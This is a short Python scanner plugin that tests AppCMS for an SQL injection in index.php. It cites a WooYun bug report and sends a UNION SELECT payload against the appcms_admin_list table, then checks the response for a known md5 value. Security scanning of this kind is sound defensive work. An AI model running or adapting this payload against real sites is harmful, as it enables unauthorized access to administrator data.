#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = appcms index sql 
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-045643

def assign(service, arg):
    if service == 'appcms':
	return True, arg

def audit(arg):
    payload = "index.php?q=xxoo%27%20union%20select%20md5(1),2,3%20from%20appcms_admin_list%20where%20uid%20like%20%27"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in body:
        security_hole(target)

if __name__ == '__main__':
	from dummy import *
	audit(assign('appcms', 'http://127.0.0.1/appcms-1.3.834/')[1])